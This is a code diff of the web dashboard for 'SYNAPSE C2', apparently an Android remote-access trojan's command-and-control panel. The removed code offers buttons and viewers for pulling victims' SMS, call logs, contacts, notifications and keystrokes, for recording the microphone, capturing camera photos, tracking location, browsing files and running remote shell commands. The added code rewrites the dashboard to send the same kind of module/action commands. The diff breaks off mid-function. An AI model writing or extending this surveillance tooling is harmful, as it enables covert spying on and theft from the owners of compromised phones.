-          <button class="btn" style="border-color:var(--green);color:var(--green)" onclick="quickCmd('ping','ping')" id="qb-ping" disabled>🏓 Ping</button>
-          <button class="btn" style="border-color:var(--accent);color:var(--accent)" onclick="quickCmd('info','gather')" id="qb-info" disabled>📋 Info</button>
-          <button class="btn" style="border-color:var(--yellow);color:var(--yellow)" onclick="quickShell()" id="qb-shell" disabled>💻 Shell</button>
-          <button class="btn" style="border-color:var(--teal);color:var(--teal)" onclick="quickCmd('sms','list')" id="qb-sms" disabled>💬 SMS</button>
-          <button class="btn" style="border-color:var(--pink);color:var(--pink)" onclick="quickCmd('calls','list')" id="qb-calls" disabled>📞 Calls</button>
-          <button class="btn" style="border-color:var(--purple);color:var(--purple)" onclick="quickCmd('contacts','list')" id="qb-contacts" disabled>👥 Contacts</button>
-          <button class="btn" style="border-color:var(--red);color:var(--red)" onclick="quickCmd('mic','record')" id="qb-mic" disabled>🎙️ Mic 30s</button>
-          <button class="btn" style="border-color:var(--yellow);color:var(--yellow)" onclick="quickCmd('notifications','list')" id="qb-notifs" disabled>🔔 Notifs</button>
-          <button class="btn" style="border-color:var(--orange);color:var(--orange)" onclick="quickCmd('keylog','dump')" id="qb-keylog" disabled>⌨️ Keylog</button>
-          <button class="btn" style="border-color:var(--cyan);color:var(--cyan)" onclick="quickCmd('location','get')" id="qb-location" disabled>📍 Location</button>
-          <button class="btn" style="border-color:var(--purple);color:var(--purple)" onclick="quickCmd('camera','capture')" id="qb-camera" disabled>📸 Camera</button>
-          <button class="btn" style="border-color:var(--orange);color:var(--orange)" onclick="quickFileList()" id="qb-files-btn" disabled>📁 Files</button>
-        </div>
-        <div class="cmd-row">
-          <input class="mod-input" id="cmd-module" placeholder="module" value="ping">
-          <input class="act-input" id="cmd-action" placeholder="action" value="ping">
-          <input class="params-input" id="cmd-params" placeholder='params JSON e.g. {"cmd":"ls -la"}'>
-          <button class="cmd-send-btn" id="cmd-send-btn" disabled onclick="sendCommand()">▶ Send</button>
-        </div>
-        <div class="cmd-history-scroll" id="cmd-history"><div class="cmd-empty">No commands sent yet</div></div>
-      </div>
-    </div>
-
-    <!-- ========== PANEL: SMS VIEWER ========== -->
-    <div class="tab-panel" id="panel-sms"><div class="data-panel">
-      <div class="data-toolbar">
-        <button class="btn btn-primary btn-sm" onclick="fetchSMS()" id="btn-sms-fetch" disabled>🔄 Fetch SMS</button>
-        <input type="text" id="sms-search" placeholder="Search SMS..." oninput="renderSmsViewer()">
-        <select id="sms-group" onchange="renderSmsViewer()">
-          <option value="conversation">Group by Conversation</option>
-          <option value="flat">Flat List</option>
-        </select>
-        <button class="btn btn-success btn-sm" onclick="exportData('sms')">📥 Export JSON</button>
-        <button class="btn btn-sm" onclick="exportCSV('sms')">📊 Export CSV</button>
-        <span style="color:var(--dim);font-size:10px" id="sms-count"></span>
-      </div>
-      <div class="data-table-wrap" id="sms-viewer"><div class="empty-state"><span class="icon">💬</span>Click "Fetch SMS" to load messages</div></div>
-    </div></div>
-
-    <!-- ========== PANEL: CALLS VIEWER ========== -->
-    <div class="tab-panel" id="panel-calls"><div class="data-panel">
-      <div class="data-toolbar">
-        <button class="btn btn-primary btn-sm" onclick="fetchCalls()" id="btn-calls-fetch" disabled>🔄 Fetch Calls</button>
-        <input type="text" id="calls-search" placeholder="Search by number..." oninput="renderCallsViewer()">
-        <select id="calls-filter" onchange="renderCallsViewer()">
-          <option value="all">All Types</option><option value="incoming">Incoming</option>
-          <option value="outgoing">Outgoing</option><option value="missed">Missed</option>
-        </select>
-        <button class="btn btn-success btn-sm" onclick="exportData('calls')">📥 Export JSON</button>
-        <button class="btn btn-sm" onclick="exportCSV('calls')">📊 Export CSV</button>
-        <span style="color:var(--dim);font-size:10px" id="calls-count"></span>
-      </div>
-      <div class="data-table-wrap" id="calls-viewer"><div class="empty-state"><span class="icon">📞</span>Click "Fetch Calls" to load call log</div></div>
-    </div></div>
-
-    <!-- ========== PANEL: CONTACTS VIEWER ========== -->
-    <div class="tab-panel" id="panel-contacts"><div class="data-panel">
-      <div class="data-toolbar">
-        <button class="btn btn-primary btn-sm" onclick="fetchContacts()" id="btn-contacts-fetch" disabled>🔄 Fetch Contacts</button>
-        <input type="text" id="contacts-search" placeholder="Search contacts..." oninput="renderContactsViewer()">
-        <button class="btn btn-success btn-sm" onclick="exportData('contacts')">📥 Export JSON</button>
-        <button class="btn btn-sm" onclick="exportCSV('contacts')">📊 Export CSV</button>
-        <span style="color:var(--dim);font-size:10px" id="contacts-count"></span>
-      </div>
-      <div class="data-table-wrap" id="contacts-viewer"><div class="empty-state"><span class="icon">👥</span>Click "Fetch Contacts" to load contacts</div></div>
-    </div></div>
-
-    <!-- ========== PANEL: MIC RECORDINGS ========== -->
-    <div class="tab-panel" id="panel-mic"><div class="data-panel">
-      <div class="data-toolbar">
-        <button class="btn btn-danger btn-sm" onclick="quickCmd('mic','record','{\"duration\":30}')" id="btn-mic-record" disabled>🎙️ Record 30s</button>
-        <button class="btn btn-sm" onclick="quickCmd('mic','stop')" id="btn-mic-stop" disabled>⏹ Stop</button>
-        <button class="btn btn-success btn-sm" onclick="exportData('mic')">📥 Export JSON</button>
-        <span style="color:var(--dim);font-size:10px" id="mic-count"></span>
-      </div>
-      <div class="data-table-wrap" id="mic-viewer"><div class="empty-state"><span class="icon">🎙️</span>Record audio to see it here</div></div>
-    </div></div>
-
-    <!-- ========== PANEL: NOTIFICATIONS ========== -->
-    <div class="tab-panel" id="panel-notifications"><div class="data-panel">
-      <div class="data-toolbar">
-        <button class="btn btn-primary btn-sm" onclick="quickCmd('notifications','list')" id="btn-notifs-fetch" disabled>🔄 Fetch Notifications</button>
-        <input type="text" id="notifs-search" placeholder="Filter by app/title..." oninput="renderNotifsViewer()">
-        <button class="btn btn-success btn-sm" onclick="exportData('notifications')">📥 Export JSON</button>
-        <button class="btn btn-sm" onclick="exportCSV('notifications')">📊 Export CSV</button>
-        <span style="color:var(--dim);font-size:10px" id="notifs-count"></span>
-      </div>
-      <div id="notifs-viewer" style="flex:1;overflow:auto;background:var(--bg)"><div class="empty-state"><span class="icon">🔔</span>No notifications captured yet</div></div>
-    </div></div>
-
-    <!-- ========== PANEL: KEYLOG VIEWER ========== -->
-    <div class="tab-panel" id="panel-keylog"><div class="data-panel">
-      <div class="data-toolbar">
-        <button class="btn btn-primary btn-sm" onclick="quickCmd('keylog','dump')" id="btn-keylog-fetch" disabled>🔄 Fetch Keylog</button>
-        <button class="btn btn-sm" onclick="quickCmd('keylog','start')" id="btn-keylog-start" disabled>▶ Start</button>
-        <button class="btn btn-sm" onclick="quickCmd('keylog','stop')" id="btn-keylog-stop" disabled>⏹ Stop</button>
-        <input type="text" id="keylog-search" placeholder="Filter by package..." oninput="renderKeylogViewer()">
-        <button class="btn btn-success btn-sm" onclick="exportData('keylog')">📥 Export JSON</button>
-        <button class="btn btn-sm" onclick="exportCSV('keylog')">📊 Export CSV</button>
-        <span style="color:var(--dim);font-size:10px" id="keylog-count"></span>
-      </div>
-      <div class="keylog-list" id="keylog-viewer"><div class="empty-state"><span class="icon">⌨️</span>No keystrokes captured yet</div></div>
-    </div></div>
-
-    <!-- ========== PANEL: CAMERA ========== -->
-    <div class="tab-panel" id="panel-camera"><div class="data-panel">
-      <div class="data-toolbar">
-        <button class="btn btn-primary btn-sm" onclick="captureCamera()" id="btn-camera-capture" disabled>📸 Capture Photo</button>
-        <span style="font-size:10px;color:var(--dim)">Images from camera module appear below</span>
-      </div>
-      <div class="camera-scroll" id="camera-gallery"><div class="empty-state" style="grid-column:1/-1"><span class="icon">📸</span>No camera captures yet</div></div>
-    </div></div>
-
-    <!-- ========== PANEL: SHELL ========== -->
-    <div class="tab-panel" id="panel-shell"><div class="shell-panel">
-      <div class="shell-input-row">
-        <input type="text" id="shell-input" placeholder="Enter shell command..." onkeydown="shellKeydown(event)">
-        <button id="shell-exec-btn" disabled onclick="execShell()">▶ Execute</button>
-      </div>
-      <div class="shell-terminal" id="shell-terminal"><div class="s-line">── Synapse Shell Terminal ──</div><div class="s-line" style="color:var(--dim)">Select an online device and type a command.</div><div class="s-line">&nbsp;</div></div>
-    </div></div>
-
-    <!-- ========== PANEL: FILES ========== -->
-    <div class="tab-panel" id="panel-files"><div class="file-browser">
-      <div class="file-toolbar">
-        <div class="breadcrumb" id="file-breadcrumb">📁 /</div>
-        <input class="path-input" id="file-path-input" placeholder="/sdcard/DCIM" value="/sdcard/DCIM">
-        <button class="btn btn-primary btn-sm" onclick="quickFileList()" id="btn-files-list" disabled>List Files</button>
-        <button class="btn btn-sm" onclick="clearFileBrowser()">Clear</button>
-      </div>
-      <div class="file-grid" id="file-grid"><div class="empty-state" style="grid-column:1/-1"><span class="icon">📁</span>Select a path and click "List Files"</div></div>
-    </div></div>
-
-    <!-- ========== PANEL: MAP ========== -->
-    <div class="tab-panel" id="panel-map"><div class="map-panel">
-      <div class="map-container" id="map-container"></div>
-      <div class="map-empty" id="map-empty"><div style="text-align:center"><span class="icon">🗺️</span>Send a "location/get" command to see device on the map</div></div>
-      <div class="map-pin-info" id="map-pin-info" style="display:none"><div class="coords" id="map-pin-coords"></div><div class="meta" id="map-pin-meta"></div></div>
-    </div></div>
-
-  </div><!-- /main -->
-</div><!-- /layout -->
-
-<!-- IMAGE LIGHTBOX -->
-<div class="modal-overlay" id="image-modal" onclick="closeImageModal()"><div class="modal-close">&times;</div><img id="modal-image" src="" alt="Full size"></div>
+  </div>
+</div>
 
 <!-- TOAST -->
 <div class="toast-container" id="toast-container"></div>
 
-<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <script>
 // ============================================================
-// SYNAPSE C2 — DASHBOARD v2.0
+// SYNAPSE C2 — BULLETPROOF SINGLE-PAGE DASHBOARD
+// One global variable. No duplicates. All functions defined before use.
 // ============================================================
-const API = window.location.origin;
-let selectedDevice = null;
-let devices = {};
-let resultCount = 0;
-let sseConnected = false;
-let currentFeedFilter = 'all';
-let activeTab = 'feed';
-let mapInstance = null, mapMarker = null;
-let fileEntries = [];
-let shellHistory = [], shellHistoryIdx = -1;
-let cameraImages = [];
-let feedEntries = [];
 
-// Per-module data stores
-let smsData = [];
-let callsData = [];
-let contactsData = [];
-let micData = [];
-let notifsData = [];
-let keylogData = [];
+// --- STATE (single source of truth) ---
+var activeDeviceId = null;
+var devicesCache = {};
+var resultCount = 0;
+var lastResult = null;
 
-// ========== DEVICE MANAGEMENT ==========
-function toggleSidebar(){ const s=document.getElementById('sidebar');s.classList.toggle('mobile-show'); }
+// --- CONSTANTS ---
+var API_BASE = window.location.origin;
 
-async function fetchDevices(){
-  try{
-    const r=await fetch(API+'/api/devices'); const d=await r.json();
-    devices={}; let online=0,offline=0;
-    (d.devices||[]).forEach(x=>{devices[x.device_id]=x; x.online?online++:offline++;});
-    document.getElementById('st-total').textContent=d.count||0;
-    document.getElementById('st-online').textContent=online;
-    document.getElementById('st-offline').textContent=offline;
-    document.getElementById('device-count').textContent=`(${d.count||0})`;
+// ================================================================
+// TOAST NOTIFICATIONS
+// ================================================================
+function showToast(msg, type) {
+    var container = document.getElementById('toast-container');
+    var t = document.createElement('div');
+    t.className = 'toast ' + (type || '');
+    t.textContent = msg;
+    container.appendChild(t);
+    setTimeout(function() { t.remove(); }, 3000);
+}
+
+// ================================================================
+// DEVICE FETCHING & RENDERING
+// ================================================================
+function fetchDevices() {
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', API_BASE + '/api/devices', true);
+    xhr.onload = function() {
+        if (xhr.status !== 200) return;
+        try {
+            var data = JSON.parse(xhr.responseText);
+            devicesCache = {};
+            var online = 0, offline = 0;
+            (data.devices || []).forEach(function(d) {
+                devicesCache[d.device_id] = d;
+                if (d.online) online++; else offline++;
+            });
+            document.getElementById('st-online').textContent = online;
+            document.getElementById('st-offline').textContent = offline;
+            document.getElementById('dev-count').textContent = '(' + (data.count || 0) + ')';
+            renderDeviceList();
+            autoSelectDevice();
+        } catch(e) {}
+    };
+    xhr.send();
+}
+
+function renderDeviceList() {
+    var list = document.getElementById('device-list');
+    var ids = Object.keys(devicesCache);
+    if (ids.length === 0) {
+        list.innerHTML = '<div style="color:var(--dim);text-align:center;padding:24px;font-size:11px">No devices</div>';
+        return;
+    }
+    var html = '';
+    ids.forEach(function(id) {
+        var d = devicesCache[id];
+        var sel = (activeDeviceId === id) ? ' selected' : '';
+        var dot = d.online ? 'online' : 'offline';
+        var shortId = id.length > 18 ? id.substring(0, 14) + '...' : id;
+        html += '<div class="device-card' + sel + '" onclick="selectDevice(\'' + id + '\')">' +
+            '<div class="dev-row">' +
+            '<span class="status-dot ' + dot + '"></span>' +
+            '<span class="dev-id">' + shortId + '</span>' +
+            '</div>' +
+            '<div class="dev-meta">' + (d.model || 'Unknown') + ' <span>' + (d.online ? 'Online' : 'Offline') + '</span></div>' +
+            '</div>';
+    });
+    list.innerHTML = html;
+}
+
+// ================================================================
+// DEVICE SELECTION
+// ================================================================
+function selectDevice(id) {
+    // Clicking the same device does NOT deselect — sticky selection
+    activeDeviceId = id;
     renderDeviceList();
-    ensureDeviceSelected();
-  }catch(e){console.error(e)}
+    updateInfoPanel();
+    updateButtons();
 }
 
-function renderDeviceList(){
-  const search=(document.getElementById('device-search').value||'').toLowerCase();
-  const list=document.getElementById('device-list');
-  const ids=Object.keys(devices).filter(id=>!search||id.toLowerCase().includes(search)||(devices[id].model||'').toLowerCase().includes(search));
-  if(!ids.length){list.innerHTML='<div style="color:var(--dim);text-align:center;padding:20px;font-size:11px">No devices</div>';return}
-  list.innerHTML=ids.map(id=>{
-    const d=devices[id];
-    return `<div class="device-card${selectedDevice===id?' selected':''}" onclick="selectDevice('${id}')">
-      <div class="dev-top"><span class="dev-dot ${d.online?'online':'offline'}"></span><span class="dev-id">${id.substring(0,16)}...</span></div>
-      <div class="dev-meta">${d.model||'Unknown'} · <span>${d.online?'Online':'Offline'}</span></div>
-    </div>`;
-  }).join('');
-}
-
-function ensureDeviceSelected(){
-  if(selectedDevice && devices[selectedDevice] && devices[selectedDevice].online) return;
-  // Auto-select first online device
-  const first = Object.values(devices).find(d=>d.online);
-  if(first && first.id) selectDevice(first.id, true);
-}
-
-function selectDevice(id, silent){
-  if(selectedDevice===id&&!silent){selectedDevice=null;}else{selectedDevice=id;}
-  renderDeviceList();
-  updateDeviceInfo();
-  updateQuickButtons();
-}
-
-function updateDeviceInfo(){
-  const panel=document.getElementById('device-info-panel');
-  if(!selectedDevice||!devices[selectedDevice]){panel.style.display='none';return}
-  panel.style.display='block';
-  const d=devices[selectedDevice];
-  document.getElementById('device-info-card').innerHTML=`
-    <div class="info-row"><span class="info-label">Status:</span><span class="info-value">${d.online?'<span style="color:var(--green)">● Online</span>':'<span style="color:var(--red)">● Offline</span>'}</span></div>
-    <div class="info-row"><span class="info-label">Model:</span><span class="info-value">${d.model||'N/A'}</span></div>
-    <div class="info-row"><span class="info-label">Brand:</span><span class="info-value">${d.brand||'N/A'}</span></div>
-    <div class="info-row"><span class="info-label">SDK:</span><span class="info-value">${d.sdk||'N/A'}</span></div>
-    <div class="info-row"><span class="info-label">Android:</span><span class="info-value">${d.release||'N/A'}</span></div>
-    <div class="info-row"><span class="info-label">Last Seen:</span><span class="info-value">${d.last_seen||'N/A'}</span></div>`;
-}
-
-function updateQuickButtons(){
-  const online=selectedDevice&&devices[selectedDevice]&&devices[selectedDevice].online;
-  const ids=['qb-ping','qb-info','qb-shell','qb-sms','qb-calls','qb-contacts','qb-mic','qb-notifs','qb-keylog','qb-location','qb-camera','qb-files-btn',
-    'cmd-send-btn','btn-sms-fetch','btn-calls-fetch','btn-contacts-fetch','btn-mic-record','btn-mic-stop','btn-notifs-fetch','btn-keylog-fetch','btn-keylog-start','btn-keylog-stop',
-    'btn-camera-capture','btn-files-list','shell-exec-btn','qb-files2'];
-  ids.forEach(id=>{const el=document.getElementById(id);if(el)el.disabled=!online;});
-}
-
-// ========== COMMANDS ==========
-function quickCmd(mod,act,params='{}'){document.getElementById('cmd-module').value=mod;document.getElementById('cmd-action').value=act;document.getElementById('cmd-params').value=params;sendCommand();}
-function quickShell(){const cmd=prompt('Enter shell command:');if(cmd)quickCmd('shell','exec',JSON.stringify({cmd}));}
-function quickFileList(){const path=document.getElementById('file-path-input').value||'/sdcard/DCIM';quickCmd('files','list',JSON.stringify({path,count:'100'}));}
-
-async function sendCommand(){
-  if(!selectedDevice){toast('Select a device first','error');return}
-  const mod=document.getElementById('cmd-module').value.trim();
-  const act=document.getElementById('cmd-action').value.trim();
-  const params=document.getElementById('cmd-params').value.trim();
-  if(!mod||!act){toast('Module and action required','error');return}
-  let parsed={};
-  if(params){try{parsed=JSON.parse(params)}catch(e){toast('Invalid JSON params','error');return}}
-  try{
-    const r=await fetch(API+'/api/command',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({device_id:selectedDevice,module:mod,action:act,params:parsed})});
-    const d=await r.json();
-    if(d.error)toast(d.error,'error'); else toast(`Command sent: ${mod}/${act} [${d.command_id?.substring(0,8)}...]`,'success');
-    addCmdHistory(mod,act,params,d.command_id);
-  }catch(e){toast('Failed: '+e.message,'error')}
-}
-
-let cmdHistory=[];
-function addCmdHistory(mod,act,params,id){
-  cmdHistory.unshift({mod,act,params,id,time:new Date().toLocaleTimeString()});
-  renderCmdHistory();
-}
-function renderCmdHistory(){
-  const h=document.getElementById('cmd-history');
-  if(!cmdHistory.length){h.innerHTML='<div class="cmd-empty">No commands sent yet</div>';return}
-  h.innerHTML=cmdHistory.map(c=>`<div class="cmd-history-entry" onclick="replayCmd('${c.mod}','${c.act}','${c.params}')"><span class="h-mod">${c.mod}</span><span class="h-act">/${c.act}</span><span class="h-params">${c.params}</span><span class="h-time">${c.time}</span></div>`).join('');
-}
-function replayCmd(mod,act,params){document.getElementById('cmd-module').value=mod;document.getElementById('cmd-action').value=act;document.getElementById('cmd-params').value=params;sendCommand();}
-
-// ========== MODULE-SPECIFIC FETCHES ==========
-function fetchSMS(){quickCmd('sms','list','{"count":"200"}')}
-function fetchCalls(){quickCmd('calls','list','{"count":"200"}')}
-function fetchContacts(){quickCmd('contacts','list','{"count":"500"}')}
-function captureCamera(){quickCmd('camera','capture','{}')}
-
-// ========== SHELL ==========
-function execShell(){
-  const cmd=document.getElementById('shell-input').value.trim();
-  if(!cmd)return;
-  shellHistory.push(cmd);shellHistoryIdx=shellHistory.length;
-  quickCmd('shell','exec',JSON.stringify({cmd}));
-  document.getElementById('shell-input').value='';
-}
-function shellKeydown(e){
-  if(e.key==='Enter'){execShell();return}
-  if(e.key==='ArrowUp'){e.preventDefault();if(shellHistoryIdx>0){shellHistoryIdx--;document.getElementById('shell-input').value=shellHistory[shellHistoryIdx]||'';}}
-  if(e.key==='ArrowDown'){e.preventDefault();if(shellHistoryIdx<shellHistory.length-1){shellHistoryIdx++;document.getElementById('shell-input').value=shellHistory[shellHistoryIdx]||'';}else{shellHistoryIdx=shellHistory.length;document.getElementById('shell-input').value='';}}
-}
-
-// ========== SSE ==========
-function connectSSE(){
-  const evtSource=new EventSource(API+'/api/events');
-  evtSource.onopen=()=>{sseConnected=true;document.getElementById('sse-dot').className='dot green';document.getElementById('sse-status').textContent='Connected';};
-  evtSource.onerror=()=>{sseConnected=false;document.getElementById('sse-dot').className='dot red';document.getElementById('sse-status').textContent='Disconnected';evtSource.close();setTimeout(connectSSE,5000);};
-  evtSource.onmessage=e=>{
-    try{
-      const result=JSON.parse(e.data);
-      if(!result)return;
-      resultCount++;
-      document.getElementById('st-results').textContent=resultCount;
-
-      // Extract typed payload from the decrypted data
-      let payload=null,payloadType='';
-      try{
-        const env=JSON.parse(result.data||'{}');
-        if(env.payload&&env.type){
-          payload=env.payload;
-          payloadType=env.type;
+function autoSelectDevice() {
+    // If current selection is still valid and online, keep it
+    if (activeDeviceId && devicesCache[activeDeviceId] && devicesCache[activeDeviceId].online) {
+        updateInfoPanel();
+        updateButtons();
+        return;
+    }
+    // Auto-select the first online device
+    var ids = Object.keys(devicesCache);
+    for (var i = 0; i < ids.length; i++) {
+        var d = devicesCache[ids[i]];
+        if (d.online) {
+            activeDeviceId = ids[i];
+            renderDeviceList();
+            updateInfoPanel();
+            updateButtons();
+            return;
         }
-      }catch(_){}
-
-      // Store in module-specific data stores
-      if(payloadType==='sms_list'&&payload.messages){smsData=payload.messages;renderSmsViewer();}
-      if(payloadType==='calls_list'&&payload.calls){callsData=payload.calls;renderCallsViewer();}
-      if(payloadType==='contacts_list'&&payload.contacts){contactsData=payload.contacts;renderContactsViewer();}
-      if(payloadType==='mic_recording'){micData.push({...payload,device_id:result.device_id,time:result.time});renderMicViewer();}
-      if(payloadType==='notifications_list'&&payload.notifications){notifsData=payload.notifications;renderNotifsViewer();}
-      if(payloadType==='keylog_dump'&&payload.keystrokes){keylogData=payload.keystrokes;renderKeylogViewer();}
-
-      // Camera image handling
-      if(payloadType==='camera'&&payload.image_base64){cameraImages.push({...payload,device_id:result.device_id,time:result.time});renderCameraGallery();}
-
-      // Live feed
-      addFeedEntry(result,payload,payloadType);
-    }catch(ex){console.error('SSE parse:',ex)}
-  };
+    }
+    // No online device — if there's any device, select it
+    if (ids.length > 0 && !activeDeviceId) {
+        activeDeviceId = ids[0];
+        renderDeviceList();
+        updateInfoPanel();
+        updateButtons();
+    }
 }
 
-function addFeedEntry(result,payload,ptype){
-  const cls=getFeedClass(ptype);
-  const tag=getFeedTag(ptype);
-
-  let body='';
-  if(ptype==='ping'){body=`<div class="ping-badge">🏓 PONG — latency: ${payload.latency_ms||0}ms</div>`}
-  else if(ptype==='device_info'){body=`Model: ${payload.model}<br>Brand: ${payload.brand}<br>SDK: ${payload.sdk}<br>Release: ${payload.release}`}
-  else if(ptype==='shell'){body=`<span style="color:var(--yellow)">$ ${result.command||''}</span>\n${payload.stdout||''}<span class="s-stderr" style="display:${payload.stderr?'block':'none'}">${payload.stderr||''}</span><div class="s-exit${payload.exit_code!==0?' nonzero':''}">Exit: ${payload.exit_code}</div>`}
-  else if(ptype==='camera'&&payload.image_base64){body=`<img class="feed-image" src="data:image/jpeg;base64,${payload.image_base64}" loading="lazy" onclick="openImageModal(this.src)" alt="Camera capture">`}
-  else if(ptype==='file_list'){body=`${payload.entries?.length||0} files / directories`}
-  else if(ptype==='location'){body=`<div class="location-block"><span>📍</span><span class="coords">${payload.lat}, ${payload.lng}</span><span>±${payload.accuracy}m</span></div>`}
-  else if(ptype==='sms_list'){body=`${payload.count||0} SMS messages — <span style="color:var(--accent);cursor:pointer" onclick="switchTab('sms')">View in SMS tab</span>`}
-  else if(ptype==='calls_list'){body=`${payload.count||0} call records — <span style="color:var(--accent);cursor:pointer" onclick="switchTab('calls')">View in Calls tab</span>`}
-  else if(ptype==='contacts_list'){body=`${payload.count||0} contacts — <span style="color:var(--accent);cursor:pointer" onclick="switchTab('contacts')">View in Contacts tab</span>`}
-  else if(ptype==='mic_recording'){body=`🎙️ Recording: ${payload.duration_seconds||0}s, ${(payload.size_bytes/1024).toFixed(1)}KB — <span style="color:var(--accent);cursor:pointer" onclick="switchTab('mic')">Play in Mic tab</span>`}
-  else if(ptype==='notifications_list'){body=`${payload.count||0} notifications — <span style="color:var(--accent);cursor:pointer" onclick="switchTab('notifications')">View in Notifs tab</span>`}
-  else if(ptype==='keylog_dump'){body=`${payload.count||0} keystrokes — <span style="color:var(--accent);cursor:pointer" onclick="switchTab('keylog')">View in Keylog tab</span>`}
-  else if(ptype==='error'){body=`<div class="error-block">${payload.error||result.error||''}</div>`}
-  else{body=JSON.stringify(payload||result,null,2).substring(0,500)}
-
-  const entry={
-    device_id:result.device_id, cmd_id:result.cmd_id, time:result.time||new Date().toISOString(),
-    type:ptype, tag, cls, body, status:result.status||'', raw:result
-  };
-  feedEntries.unshift(entry);
-  if(feedEntries.length>500)feedEntries.length=500;
-  renderFeed();
+// ================================================================
+// INFO PANEL
+// ================================================================
+function updateInfoPanel() {
+    var panel = document.getElementById('info-panel');
+    if (!activeDeviceId || !devicesCache[activeDeviceId]) {
+        panel.classList.remove('visible');
+        return;
+    }
+    panel.classList.add('visible');
+    var d = devicesCache[activeDeviceId];
+    document.getElementById('inf-status').innerHTML = d.online
+        ? '<span style="color:var(--green)">Online</span>'
+        : '<span style="color:var(--red)">Offline</span>';
+    document.getElementById('inf-model').textContent = d.model || 'N/A';
+    document.getElementById('inf-brand').textContent = d.brand || 'N/A';
+    document.getElementById('inf-sdk').textContent = d.sdk || 'N/A';
+    document.getElementById('inf-os').textContent = d.release || d.os_version || 'N/A';
+    document.getElementById('inf-seen').textContent = d.last_seen || 'N/A';
 }
 
-function getFeedClass(ptype){
-  const map={ping:'ping',device_info:'info',shell:'shell',camera:'camera',file_list:'files',file_read:'files',location:'location',sms_list:'sms',calls_list:'calls',contacts_list:'contacts',mic_recording:'mic',notifications_list:'notifications',keylog_dump:'keylog',error:'error'};
-  return map[ptype]||'';
-}
-function getFeedTag(ptype){
-  const map={ping:'PING',device_info:'INFO',shell:'SHELL',camera:'CAMERA',file_list:'FILES',file_read:'FILES',location:'LOCATION',sms_list:'SMS',calls_list:'CALLS',contacts_list:'CONTACTS',mic_recording:'MIC',notifications_list:'NOTIFS',keylog_dump:'KEYLOG',error:'ERROR'};
-  return map[ptype]||ptype.toUpperCase();
-}
-
-function renderFeed(){
-  const el=document.getElementById('live-feed');
-  let filtered=feedEntries;
-  if(currentFeedFilter!=='all')filtered=feedEntries.filter(e=>e.cls===currentFeedFilter);
-  if(!filtered.length){el.innerHTML='<div class="loading"><span class="icon">📡</span>No matching entries</div>';return}
-  el.innerHTML=filtered.map(e=>`<div class="feed-entry ${e.cls}">
-    <div class="feed-meta"><span>${e.device_id?.substring(0,12)||'?'}...</span><span class="feed-tag ${e.cls}">${e.tag}</span><span>${e.time||''}</span><span style="color:var(--green)" class="${e.status==='ok'?'':'error'}">${e.status||''}</span></div>
-    <div class="feed-body">${e.body}</div>
-  </div>`).join('');
-  document.getElementById('badge-feed').textContent=filtered.length;document.getElementById('badge-feed').style.display=filtered.length?'inline':'none';
+// ================================================================
+// BUTTON STATE
+// ================================================================
+function updateButtons() {
+    var online = activeDeviceId && devicesCache[activeDeviceId] && devicesCache[activeDeviceId].online;
+    var ids = [
+        'btn-ping','btn-info','btn-sms','btn-calls','btn-contacts',
+        'btn-files','btn-shell','btn-location','btn-mic','btn-camera'
+    ];
+    ids.forEach(function(id) {
+        var el = document.getElementById(id);
+        if (el) el.disabled = !online;
+    });
 }
 
-// ========== DATA VIEWERS ==========
-// SMS
-function renderSmsViewer(){
-  const search=(document.getElementById('sms-search')?.value||'').toLowerCase();
-  const groupMode=(document.getElementById('sms-group')?.value||'conversation')==='conversation';
-  const filtered=smsData.filter(m=>!search||m.address.toLowerCase().includes(search)||m.body.toLowerCase().includes(search));
-  document.getElementById('sms-count').textContent=`${filtered.length} messages`;
+// ================================================================
+// SEND COMMANDS
+// ================================================================
+function sendQuickCommand(module, action, paramsJson) {
+    if (!activeDeviceId) {
+        showToast('No device selected', 'error');
+        return;
+    }
+    if (!devicesCache[activeDeviceId] || !devicesCache[activeDeviceId].online) {
+        showToast('Selected device is offline', 'error');
+        return;
+    }
 
-  const wrap=document.getElementById('sms-viewer');
-  if(!filtered.length){wrap.innerHTML='<div class="empty-state"><span class="icon">💬</span>No messages found</div>';return}
+    var params = {};
+    if (paramsJson) {
+        try { params = JSON.parse(paramsJson); } catch(e) {
+            showToast('Invalid params JSON', 'error');
+            return;
+        }
+    }
 
-  if(groupMode){
-    const groups={};
-    filtered.forEach(m=>{const key=m.address||'Unknown';if(!groups[key])groups[key]=[];groups[key].push(m);});
-    wrap.innerHTML=Object.entries(groups).map(([addr,msgs])=>`<div class="convo-group">
-      <div class="convo-header" onclick="this.nextElementSibling.classList.toggle('open')">
-        <span>📱</span><span class="c-addr">${addr}</span><span class="c-count">${msgs.length} messages</span>
-        <span style="font-size:9px;color:var(--dim)">▲</span>
-      </div>
-      <div class="convo-body"><table>${msgs.map(m=>`<tr>
-        <td style="color:var(--dim);font-size:9px;width:60px">${m.type}</td>
-        <td class="msg-body" onclick="this.style.whiteSpace='normal'" title="${(m.body||'').replace(/"/g,'&quot;')}">${m.body||''}</td>
-        <td style="color:var(--dim);font-size:9px;width:80px;text-align:right">${m.date?new Date(m.date).toLocaleString():''}</td>
-      </tr>`).join('')}</table></div>
-    </div>`).join('');
-  }else{
-    wrap.innerHTML=`<table class="data-table"><thead><tr><th>Address</th><th>Body</th><th>Type</th><th>Date</th><th>Read</th></tr></thead><tbody>${filtered.map(m=>`<tr>
-      <td>${m.address||''}</td><td class="msg-body" style="max-width:400px" onclick="this.style.whiteSpace='normal'" title="${(m.body||'').replace(/"/g,'&quot;')}">${m.body||''}</td>
-      <td>${m.type||''}</td><td>${m.date?new Date(m.date).toLocaleString():''}</td><td>${m.read?'✅':'⬜'}</td>
-    </tr>`).join('')}</tbody></table>`;
-  }
+    var payload = JSON.stringify({
+        device_id: activeDeviceId,
+        module: module,
+        action: action,
+        params: params
+    });
+
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', API_BASE + '/api/command', true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.onload = function() {
+        try {
+            var resp = JSON.parse(xhr.responseText);
+            if (resp.error) {
+                showToast(resp.error, 'error');
+            } else {
+                showToast('Sent: ' + module + '/' + action + ' [' + (resp.command_id || '').substring(0,8) + '...]', 'success');
+            }
+        } catch(e) {
+            showToast('Command sent', 'success');
+        }
+    };
+    xhr.onerror = function() {
+        showToast('Failed to send command', 'error');
+    };
+    xhr.send(payload);
+
+    // Update result header
+    document.getElementById('result-label').textContent = module + '/' + action;
